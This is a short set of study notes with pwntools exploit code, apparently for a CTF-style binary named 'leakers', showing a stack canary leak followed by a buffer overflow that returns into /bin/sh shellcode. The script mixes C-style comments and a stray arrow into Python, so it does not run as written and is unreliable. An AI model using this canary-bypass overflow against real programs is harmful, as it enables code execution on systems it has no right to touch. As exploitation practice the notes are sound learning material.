checksec --file./leakers
/*it is a pwntools utility that gives information about the program's security

why can't we go to canary ?
The breakpoint is @ the beginning of the main , the gdb.attaches at the pretty much the first
read so we're not able to see when we're setting the canary

couldn't we just use gdb.debug instead of jumping to a successive instruction ?*/
/*
If using 64 bit use
x/<number>gx <address>
else if 32 bit use
x/<number>wx <address>


x/30gx $rbp - 0x10
x/30bx $rbp - 0x10
*/
import time

shellcode = asm(CODE, arch="amd64")+b"/bin/sh\x00\x00\x00\x00\x00\x00\x00\x00"
r.recvuntil("rs!\n")
r.send(shellcode)
//we need to be sure that we do NOT mixup the two reads
time.sleep(0.1)
payload=b"A"*104+b"B"
r.recvuntil(b"AB")
canary =u64( b"\x00"+ r.read(7))//reads the 7 bytes from the canary
//what are pack and unpack 64 ?
//p encodes a string in little endian 64
//unpack goes the other way around
//canary is an integer
print("canary: %x" % canary)
//now we need to build an overflow that rewrites the thing

payload_two = b"A"*104+p64(canary)+b"CCCCDDDD"/*instruction pointer*/->
            +p64(0x404080)
time.sleep(0.1)

r.send(payload_two)
//use shellcraft to create your shellcodes
